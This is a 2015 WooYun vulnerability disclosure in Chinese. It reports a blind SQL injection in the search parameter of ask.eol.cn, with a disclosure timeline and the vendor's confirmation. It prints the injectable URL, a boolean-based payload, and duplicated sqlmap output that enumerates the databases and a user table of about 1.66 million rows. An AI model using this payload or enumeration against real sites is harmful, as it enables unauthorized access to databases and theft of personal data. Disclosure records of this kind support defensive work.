wybug_title: 中国教育在线教育百事通SQL注入一枚泄露170W用户信息
wybug_detail: 漏洞详情 披露状态：   									2015-10-15：	细节已通知厂商并且等待厂商处理中									2015-10-16：	厂商已经确认，细节仅向厂商公开									2015-10-26：	细节向核心白帽子及相关领域专家公开									2015-11-05：	细节向普通白帽子公开									2015-11-15：	细节向实习白帽子公开									2015-11-30：	细节向公众公开  简要描述： 好课网,继续加强安全吧 详细说明：  1,注入点:http://ask.eol.cn/search.do?page=5&query=%252,注入结果sqlmap identified the following injection point(s) with a total of 299 HTTP(s) requests:---Parameter: query (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: page=5&query=%%' AND 5448=5448 AND '%'='---web application technology: Nginx, JSPback-end DBMS: MySQL >= 5.0.0sqlmap resumed the following injection point(s) from stored session:---Parameter: query (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: page=5&query=%%' AND 5448=5448 AND '%'='---web application technology: Nginx, JSPback-end DBMS: MySQL 5available databases [2]:[*] ask[*] information_schema3,看看表qlmap identified the following injection point(s) with a total of 299 HTTP(s) requests:---Parameter: query (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: page=5&query=%%' AND 5448=5448 AND '%'='---web application technology: Nginx, JSPback-end DBMS: MySQL >= 5.0.0sqlmap resumed the following injection point(s) from stored session:---Parameter: query (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: page=5&query=%%' AND 5448=5448 AND '%'='---web application technology: Nginx, JSPback-end DBMS: MySQL 5available databases [2]:[*] ask[*] information_schema4,看看多少用户吧[22:33:11] [INFO] resumed: 1657401Database: ask+----------+---------+| Table    | Entries |+----------+---------+| eol_user | 1657401 |+----------+---------+   漏洞证明：  如上   修复方案：  Fix,求高rank   版权声明：转载请注明来源 逆流冰河@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2015-10-16 13:06 厂商回复： 感谢发现问题。 最新状态： 暂无
